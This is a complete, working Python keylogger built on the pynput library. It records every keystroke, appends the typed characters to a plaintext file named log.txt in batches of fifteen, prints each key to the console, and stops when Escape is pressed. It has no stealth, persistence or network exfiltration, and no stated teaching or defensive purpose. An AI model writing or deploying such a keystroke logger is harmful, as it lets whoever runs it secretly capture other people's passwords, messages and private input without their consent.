import pynput
from pynput.keyboard import Key, Listener

# Initialize counter and list to store keystrokes
count = 0
keys = []
# Function to handle key press events
def key_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")
    
    # Write to file after every 15 keystrokes
    if count >= 15:
        count = 0
        write_file(keys)
        keys = []

# Function to write keystrokes to a file
def write_file(keys):
    with open("log.txt", "a") as F:
        for key in keys:
            k = str(key).replace("'", "")
            # Insert a newline for spaces, otherwise write the key as is
            if k.find("space") > 0:
                F.write('\n')
            elif k.find("Key") == -1:
                F.write(k)

# Function to handle key release events
def key_release(key):
    # Stop listener if escape key is pressed
    if key == Key.esc:
        return False

# Set up and start listener
with Listener(on_press=key_press, on_release=key_release) as listener:
    listener.join()
